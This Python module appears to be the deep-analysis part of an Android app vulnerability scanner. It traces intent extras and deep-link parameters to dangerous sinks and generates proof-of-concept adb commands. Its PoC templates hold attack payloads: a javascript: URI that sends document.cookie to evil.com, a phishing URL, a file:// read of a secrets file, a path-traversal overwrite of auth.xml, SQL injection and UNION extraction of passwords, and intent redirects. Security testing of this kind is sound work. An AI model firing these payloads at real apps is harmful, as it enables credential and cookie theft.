"""
Deep Analysis Engine - Orchestrates code flow analysis and PoC generation.
"""

import re
import os
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from pathlib import Path


@dataclass
class CodeContext:
    """Represents analyzed code context for a class/file."""
    file_path: str
    package_name: str
    class_name: str
    is_activity: bool = False
    is_exported: bool = False
    intent_filters: List[Dict] = field(default_factory=list)
    methods: Dict[str, 'MethodContext'] = field(default_factory=dict)
    fields: Dict[str, str] = field(default_factory=dict)  # field_name -> type
    parent_class: Optional[str] = None
    interfaces: List[str] = field(default_factory=list)


@dataclass
class MethodContext:
    """Represents a method's analyzed context."""
    name: str
    params: List[Tuple[str, str]]  # (type, name)
    return_type: str
    body: str
    start_line: int
    end_line: int
    calls: List[str] = field(default_factory=list)  # Methods this method calls
    data_sources: List[Dict] = field(default_factory=list)  # Where data comes from
    data_sinks: List[Dict] = field(default_factory=list)  # Where data goes


@dataclass
class DataFlow:
    """Represents a data flow from source to sink."""
    source_type: str  # "intent_extra", "uri_param", "file", "user_input"
    source_name: str  # The actual parameter/extra name
    source_location: str  # File:line
    sink_type: str  # "webview_load", "sql_query", "file_write", etc.
    sink_method: str  # The dangerous method called
    sink_location: str
    taint_path: List[str]  # Variables the data flows through
    controllable: bool  # Can attacker control this?


@dataclass
class DeepFinding:
    """A finding with deep analysis context."""
    pattern_id: str
    title: str
    severity: str
    file_path: str
    line_number: int
    code_snippet: str

    # Deep analysis additions
    entry_points: List[Dict]  # How to reach this code
    data_flows: List[DataFlow]  # Data flow analysis
    trigger_chain: List[str]  # Method call chain to trigger
    exploit_conditions: List[str]  # What conditions must be met
    dynamic_poc: str  # Generated PoC based on actual code
    attack_surface: Dict  # Detailed attack surface info


class DeepAnalysisEngine:
    """
    Performs deep code analysis including:
    - Data flow / taint analysis
    - Call graph construction
    - Entry point identification
    - Context-aware PoC generation
    """

    def __init__(self, decompiled_path: str, manifest_data: Dict):
        self.decompiled_path = Path(decompiled_path)
        self.manifest = manifest_data
        self.package_name = manifest_data.get('package', '')

        # Caches
        self.class_cache: Dict[str, CodeContext] = {}
        self.call_graph: Dict[str, Set[str]] = {}  # caller -> callees
        self.reverse_call_graph: Dict[str, Set[str]] = {}  # callee -> callers

        # Component info from manifest
        self.exported_activities = self._parse_exported_components('activity')
        self.exported_services = self._parse_exported_components('service')
        self.exported_receivers = self._parse_exported_components('receiver')
        self.exported_providers = self._parse_exported_components('provider')

    def _parse_exported_components(self, component_type: str) -> Dict[str, Dict]:
        """Parse exported components from manifest."""
        components = {}
        for comp in self.manifest.get(f'{component_type}s', []):
            name = comp.get('name', '')
            exported = comp.get('exported', False)
            has_intent_filter = bool(comp.get('intent_filters', []))

            # Component is exported if explicitly exported OR has intent-filter
            if exported or has_intent_filter:
                components[name] = {
                    'name': name,
                    'exported': exported,
                    'intent_filters': comp.get('intent_filters', []),
                    'permission': comp.get('permission'),
                }
        return components

    def analyze_class(self, file_path: str) -> Optional[CodeContext]:
        """Parse and analyze a Java/Kotlin class file."""
        if file_path in self.class_cache:
            return self.class_cache[file_path]

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
        except:
            return None

        ctx = CodeContext(
            file_path=file_path,
            package_name=self._extract_package(content),
            class_name=self._extract_class_name(content),
        )

        # Check if it's an Activity
        ctx.parent_class = self._extract_parent_class(content)
        ctx.is_activity = self._is_activity(ctx.parent_class, content)

        # Check if exported
        full_name = f"{ctx.package_name}.{ctx.class_name}"
        if full_name in self.exported_activities:
            ctx.is_exported = True
            ctx.intent_filters = self.exported_activities[full_name].get('intent_filters', [])

        # Parse methods
        ctx.methods = self._parse_methods(content)

        # Parse fields
        ctx.fields = self._parse_fields(content)

        self.class_cache[file_path] = ctx
        return ctx

    def _extract_package(self, content: str) -> str:
        """Extract package name from source."""
        match = re.search(r'package\s+([\w.]+)\s*;', content)
        return match.group(1) if match else ''

    def _extract_class_name(self, content: str) -> str:
        """Extract class name from source."""
        match = re.search(r'(?:public\s+)?(?:abstract\s+)?(?:final\s+)?class\s+(\w+)', content)
        return match.group(1) if match else ''

    def _extract_parent_class(self, content: str) -> Optional[str]:
        """Extract parent class."""
        match = re.search(r'class\s+\w+\s+extends\s+(\w+)', content)
        return match.group(1) if match else None

    def _is_activity(self, parent: Optional[str], content: str) -> bool:
        """Check if class is an Activity."""
        activity_parents = ['Activity', 'AppCompatActivity', 'FragmentActivity',
                          'ComponentActivity', 'BaseActivity']
        if parent in activity_parents:
            return True
        # Check imports
        if re.search(r'import\s+.*\.Activity\s*;', content):
            return True
        return False

    def _parse_methods(self, content: str) -> Dict[str, MethodContext]:
        """Parse all methods from class."""
        methods = {}

        # Match method signatures and bodies
        method_pattern = r'''
            (?:public|private|protected)?\s*
            (?:static\s+)?
            (?:final\s+)?
            (\w+(?:<[^>]+>)?)\s+  # return type
            (\w+)\s*              # method name
            \(([^)]*)\)\s*        # parameters
            (?:throws\s+[\w,\s]+)?\s*
            \{
        '''

        for match in re.finditer(method_pattern, content, re.VERBOSE):
            return_type = match.group(1)
            method_name = match.group(2)
            params_str = match.group(3)

            # Find method body (simple brace matching)
            start = match.end() - 1
            body, end = self._extract_body(content, start)

            # Parse parameters
            params = []
            if params_str.strip():
                for param in params_str.split(','):
                    parts = param.strip().split()
                    if len(parts) >= 2:
                        params.append((parts[-2], parts[-1]))

            # Analyze method body
            calls = self._extract_method_calls(body)

            ctx = MethodContext(
                name=method_name,
                params=params,
                return_type=return_type,
                body=body,
                start_line=content[:match.start()].count('\n') + 1,
                end_line=content[:start + len(body)].count('\n') + 1,
                calls=calls,
            )

            methods[method_name] = ctx

        return methods

    def _extract_body(self, content: str, start: int) -> Tuple[str, int]:
        """Extract method body with brace matching."""
        depth = 0
        i = start
        while i < len(content):
            if content[i] == '{':
                depth += 1
            elif content[i] == '}':
                depth -= 1
                if depth == 0:
                    return content[start:i+1], i
            i += 1
        return content[start:], len(content)

    def _extract_method_calls(self, body: str) -> List[str]:
        """Extract method calls from body."""
        calls = []
        # Match method calls: obj.method( or method(
        pattern = r'(?:(\w+)\.)?(\w+)\s*\('
        for match in re.finditer(pattern, body):
            obj = match.group(1)
            method = match.group(2)
            if obj:
                calls.append(f"{obj}.{method}")
            else:
                calls.append(method)
        return calls

    def _parse_fields(self, content: str) -> Dict[str, str]:
        """Parse class fields."""
        fields = {}
        pattern = r'(?:private|protected|public)\s+(?:static\s+)?(?:final\s+)?(\w+(?:<[^>]+>)?)\s+(\w+)\s*[;=]'
        for match in re.finditer(pattern, content):
            field_type = match.group(1)
            field_name = match.group(2)
            fields[field_name] = field_type
        return fields

    def trace_data_flow(self, file_path: str, sink_pattern: str,
                        sink_line: int) -> List[DataFlow]:
        """
        Trace data flow backwards from a sink to find sources.
        """
        flows = []
        ctx = self.analyze_class(file_path)
        if not ctx:
            return flows

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
        except:
            return flows

        # Find the method containing the sink
        containing_method = None
        for method in ctx.methods.values():
            if method.start_line <= sink_line <= method.end_line:
                containing_method = method
                break

        if not containing_method:
            return flows

        # Analyze the method for data flow
        body = containing_method.body

        # Look for Intent.getExtra patterns
        intent_extras = self._find_intent_extras(body)
        for extra in intent_extras:
            flows.append(DataFlow(
                source_type="intent_extra",
                source_name=extra['name'],
                source_location=f"{file_path}:{extra.get('line', sink_line)}",
                sink_type=self._classify_sink(sink_pattern),
                sink_method=sink_pattern,
                sink_location=f"{file_path}:{sink_line}",
                taint_path=extra.get('variables', []),
                controllable=True
            ))

        # Look for URI parameters
        uri_params = self._find_uri_params(body)
        for param in uri_params:
            flows.append(DataFlow(
                source_type="uri_param",
                source_name=param['name'],
                source_location=f"{file_path}:{param.get('line', sink_line)}",
                sink_type=self._classify_sink(sink_pattern),
                sink_method=sink_pattern,
                sink_location=f"{file_path}:{sink_line}",
                taint_path=param.get('variables', []),
                controllable=True
            ))

        return flows

    def _find_intent_extras(self, body: str) -> List[Dict]:
        """Find Intent extra retrievals in method body."""
        extras = []

        patterns = [
            # getStringExtra("name")
            (r'get(\w+)Extra\s*\(\s*["\']([^"\']+)["\']', 'direct'),
            # getIntent().getStringExtra("name")
            (r'getIntent\(\)\s*\.\s*get(\w+)Extra\s*\(\s*["\']([^"\']+)["\']', 'intent'),
            # intent.getStringExtra("name") where intent is variable
            (r'(\w+)\s*\.\s*get(\w+)Extra\s*\(\s*["\']([^"\']+)["\']', 'var'),
            # Bundle extras
            (r'getExtras\(\)\s*\.\s*get(\w+)\s*\(\s*["\']([^"\']+)["\']', 'bundle'),
        ]

        for pattern, ptype in patterns:
            for match in re.finditer(pattern, body):
                if ptype == 'var':
                    extras.append({
                        'name': match.group(3),
                        'type': match.group(2),
                        'variable': match.group(1),
                    })
                else:
                    extras.append({
                        'name': match.group(2),
                        'type': match.group(1),
                    })

        return extras

    def _find_uri_params(self, body: str) -> List[Dict]:
        """Find URI parameter retrievals."""
        params = []

        patterns = [
            # getData().getQueryParameter("name")
            r'getData\(\)\s*\.\s*getQueryParameter\s*\(\s*["\']([^"\']+)["\']',
            # uri.getQueryParameter("name")
            r'(\w+)\s*\.\s*getQueryParameter\s*\(\s*["\']([^"\']+)["\']',
            # getLastPathSegment()
            r'getLastPathSegment\s*\(\s*\)',
        ]

        for pattern in patterns:
            for match in re.finditer(pattern, body):
                if match.lastindex and match.lastindex >= 1:
                    params.append({'name': match.group(match.lastindex)})
                else:
                    params.append({'name': 'path_segment'})

        return params

    def _classify_sink(self, sink_pattern: str) -> str:
        """Classify the type of sink."""
        sink_map = {
            'loadUrl': 'webview_load',
            'loadData': 'webview_load',
            'evaluateJavascript': 'js_execution',
            'execSQL': 'sql_query',
            'rawQuery': 'sql_query',
            'startActivity': 'activity_start',
            'sendBroadcast': 'broadcast_send',
            'openFileOutput': 'file_write',
            'exec': 'command_exec',
        }

        for key, value in sink_map.items():
            if key in sink_pattern:
                return value
        return 'unknown'

    def find_entry_points(self, file_path: str, target_method: str) -> List[Dict]:
        """
        Find all entry points that can reach the target method.
        Returns paths from exported components to the vulnerable code.
        """
        entry_points = []
        ctx = self.analyze_class(file_path)

        if not ctx:
            return entry_points

        # If this is an exported activity, it's directly reachable
        if ctx.is_exported:
            # Check lifecycle methods
            lifecycle = ['onCreate', 'onResume', 'onNewIntent', 'onActivityResult']
            for method_name in lifecycle:
                if method_name in ctx.methods:
                    method = ctx.methods[method_name]
                    # Check if target is called from this lifecycle method
                    if target_method in method.calls or target_method in method.body:
                        entry_points.append({
                            'type': 'exported_activity',
                            'component': f"{ctx.package_name}.{ctx.class_name}",
                            'entry_method': method_name,
                            'intent_filters': ctx.intent_filters,
                            'path': [method_name, target_method],
                        })

        # Check for deep link handlers
        if ctx.intent_filters:
            for intent_filter in ctx.intent_filters:
                for data in intent_filter.get('data', []):
                    if data.get('scheme') or data.get('host'):
                        entry_points.append({
                            'type': 'deep_link',
                            'scheme': data.get('scheme', '*'),
                            'host': data.get('host', '*'),
                            'path': data.get('path', data.get('pathPrefix', '/*')),
                            'component': f"{ctx.package_name}.{ctx.class_name}",
                        })

        return entry_points

    def generate_deep_poc(self, finding: Dict, data_flows: List[DataFlow],
                          entry_points: List[Dict], ctx: CodeContext) -> str:
        """
        Generate a detailed, context-aware proof of concept.
        """
        poc_parts = []
        package = self.package_name

        poc_parts.append("# ═══════════════════════════════════════════════════")
        poc_parts.append(f"# DEEP ANALYSIS POC: {finding.get('title', 'Unknown')}")
        poc_parts.append("# ═══════════════════════════════════════════════════\n")

        # Entry point analysis
        if entry_points:
            poc_parts.append("# ENTRY POINTS IDENTIFIED:")
            for ep in entry_points:
                if ep['type'] == 'exported_activity':
                    poc_parts.append(f"#   → Exported Activity: {ep['component']}")
                    poc_parts.append(f"#   → Entry Method: {ep['entry_method']}")
                elif ep['type'] == 'deep_link':
                    poc_parts.append(f"#   → Deep Link: {ep['scheme']}://{ep['host']}{ep['path']}")
            poc_parts.append("")

        # Data flow analysis
        if data_flows:
            poc_parts.append("# DATA FLOW ANALYSIS:")
            for flow in data_flows:
                poc_parts.append(f"#   Source: {flow.source_type} → '{flow.source_name}'")
                poc_parts.append(f"#   Sink: {flow.sink_type} → {flow.sink_method}")
                poc_parts.append(f"#   Controllable: {'YES ⚠️' if flow.controllable else 'NO'}")
            poc_parts.append("")

        # Generate actual exploit commands
        poc_parts.append("# ═══════════════════════════════════════════════════")
        poc_parts.append("# EXPLOITATION COMMANDS")
        poc_parts.append("# ═══════════════════════════════════════════════════\n")

        # Based on finding type and data flows, generate specific PoC
        if data_flows:
            for flow in data_flows:
                if flow.source_type == "intent_extra":
                    poc_parts.extend(self._generate_intent_extra_poc(
                        flow, entry_points, ctx, package
                    ))
                elif flow.source_type == "uri_param":
                    poc_parts.extend(self._generate_uri_param_poc(
                        flow, entry_points, ctx, package
                    ))

        # Fallback to component-based PoC if no data flows
        if not data_flows and entry_points:
            for ep in entry_points:
                if ep['type'] == 'exported_activity':
                    poc_parts.append(f"# Launch exported activity:")
                    poc_parts.append(f"adb shell am start -n {package}/{ep['component']}")
                elif ep['type'] == 'deep_link':
                    url = f"{ep['scheme']}://{ep['host']}{ep['path']}"
                    poc_parts.append(f"# Trigger via deep link:")
                    poc_parts.append(f"adb shell am start -a android.intent.action.VIEW -d \"{url}\"")

        return '\n'.join(poc_parts)

    def _generate_intent_extra_poc(self, flow: DataFlow, entry_points: List[Dict],
                                   ctx: CodeContext, package: str) -> List[str]:
        """Generate PoC for Intent extra based attacks."""
        lines = []
        component = f"{ctx.package_name}.{ctx.class_name}"

        if flow.sink_type == 'webview_load':
            lines.append("# ATTACK: Intent Extra → WebView URL Injection")
            lines.append(f"# The app reads '{flow.source_name}' from Intent and loads it in WebView\n")

            lines.append("# Step 1: Load attacker-controlled URL (phishing/credential theft)")
            lines.append(f"adb shell am start -n {package}/{component} \\")
            lines.append(f"    --es \"{flow.source_name}\" \"https://evil.com/phishing.html\"\n")

            lines.append("# Step 2: Exploit JavaScript interface (if enabled) via file:// scheme")
            lines.append(f"adb shell am start -n {package}/{component} \\")
            lines.append(f"    --es \"{flow.source_name}\" \"file:///data/data/{package}/shared_prefs/secrets.xml\"\n")

            lines.append("# Step 3: XSS via javascript: URI (steal cookies/tokens)")
            lines.append(f"adb shell am start -n {package}/{component} \\")
            lines.append(f"    --es \"{flow.source_name}\" \"javascript:fetch('https://evil.com/steal?c='+document.cookie)\"\n")

        elif flow.sink_type == 'activity_start':
            lines.append("# ATTACK: Intent Redirect / Privilege Escalation")
            lines.append(f"# The app uses '{flow.source_name}' to start another activity\n")

            lines.append("# Step 1: Access non-exported activity via redirect")
            lines.append(f"adb shell am start -n {package}/{component} \\")
            lines.append(f"    --es \"{flow.source_name}\" \"{package}/.InternalAdminActivity\"\n")

            lines.append("# Step 2: Launch arbitrary app component")
            lines.append(f"adb shell am start -n {package}/{component} \\")
            lines.append(f"    --es \"{flow.source_name}\" \"com.android.settings/.Settings\"\n")

        elif flow.sink_type == 'file_write':
            lines.append("# ATTACK: Arbitrary File Write via Intent")
            lines.append(f"# The app uses '{flow.source_name}' as file path\n")

            lines.append("# Overwrite shared preferences")
            lines.append(f"adb shell am start -n {package}/{component} \\")
            lines.append(f"    --es \"{flow.source_name}\" \"../shared_prefs/auth.xml\" \\")
            lines.append(f"    --es \"content\" \"<map><string name='token'>attacker_token</string></map>\"\n")

        elif flow.sink_type == 'sql_query':
            lines.append("# ATTACK: SQL Injection via Intent Extra")
            lines.append(f"# The app uses '{flow.source_name}' in SQL query\n")

            lines.append("# Extract all users")
            lines.append(f"adb shell am start -n {package}/{component} \\")
            lines.append(f"    --es \"{flow.source_name}\" \"' OR '1'='1\"\n")

            lines.append("# Union-based extraction")
            lines.append(f"adb shell am start -n {package}/{component} \\")
            lines.append(f"    --es \"{flow.source_name}\" \"' UNION SELECT username,password FROM users--\"\n")

        else:
            lines.append(f"# Generic Intent Extra Attack")
            lines.append(f"adb shell am start -n {package}/{component} \\")
            lines.append(f"    --es \"{flow.source_name}\" \"ATTACKER_CONTROLLED_VALUE\"")

        return lines

    def _generate_uri_param_poc(self, flow: DataFlow, entry_points: List[Dict],
                                ctx: CodeContext, package: str) -> List[str]:
        """Generate PoC for URI parameter based attacks."""
        lines = []

        # Find deep link scheme from entry points
        deep_link = next((ep for ep in entry_points if ep['type'] == 'deep_link'), None)

        if deep_link:
            scheme = deep_link['scheme']
            host = deep_link['host']
            path = deep_link.get('path', '')

            if flow.sink_type == 'webview_load':
                lines.append("# ATTACK: Deep Link → WebView URL Injection")
                lines.append(f"# Parameter '{flow.source_name}' flows to WebView.loadUrl()\n")

                lines.append("# Step 1: Inject malicious URL via deep link")
                lines.append(f"adb shell am start -a android.intent.action.VIEW \\")
                lines.append(f"    -d \"{scheme}://{host}{path}?{flow.source_name}=https://evil.com/phish\"\n")

                lines.append("# Step 2: XSS payload via deep link")
                lines.append(f"adb shell am start -a android.intent.action.VIEW \\")
                lines.append(f"    -d \"{scheme}://{host}{path}?{flow.source_name}=javascript:alert(document.domain)\"\n")

            elif flow.sink_type == 'activity_start':
                lines.append("# ATTACK: Deep Link Parameter → Activity Redirect")
                lines.append(f"adb shell am start -a android.intent.action.VIEW \\")
                lines.append(f"    -d \"{scheme}://{host}{path}?{flow.source_name}={package}/.SecretActivity\"\n")

            else:
                lines.append(f"# Deep Link attack with parameter: {flow.source_name}")
                lines.append(f"adb shell am start -a android.intent.action.VIEW \\")
                lines.append(f"    -d \"{scheme}://{host}{path}?{flow.source_name}=PAYLOAD\"\n")

        return lines


def enrich_finding_with_deep_analysis(engine: DeepAnalysisEngine,
                                      finding: Dict) -> DeepFinding:
    """
    Take a basic pattern match finding and enrich it with deep analysis.
    """
    file_path = finding.get('file_path', '')
    line_number = finding.get('line_number', 0)
    matched_text = finding.get('matched_text', '')

    # Analyze the class
    ctx = engine.analyze_class(file_path)

    # Trace data flows
    data_flows = engine.trace_data_flow(file_path, matched_text, line_number)

    # Find entry points
    # Determine target method from line number
    target_method = None
    if ctx:
        for method in ctx.methods.values():
            if method.start_line <= line_number <= method.end_line:
                target_method = method.name
                break

    entry_points = engine.find_entry_points(file_path, target_method or '') if ctx else []

    # Generate deep PoC
    deep_poc = engine.generate_deep_poc(finding, data_flows, entry_points, ctx) if ctx else ""

    return DeepFinding(
        pattern_id=finding.get('pattern_id', ''),
        title=finding.get('title', ''),
        severity=finding.get('severity', ''),
        file_path=file_path,
        line_number=line_number,
        code_snippet=finding.get('code_snippet', ''),
        entry_points=entry_points,
        data_flows=data_flows,
        trigger_chain=[target_method] if target_method else [],
        exploit_conditions=[],
        dynamic_poc=deep_poc,
        attack_surface={
            'is_exported': ctx.is_exported if ctx else False,
            'has_intent_filters': bool(ctx.intent_filters) if ctx else False,
            'controllable_inputs': len(data_flows),
        }
    )
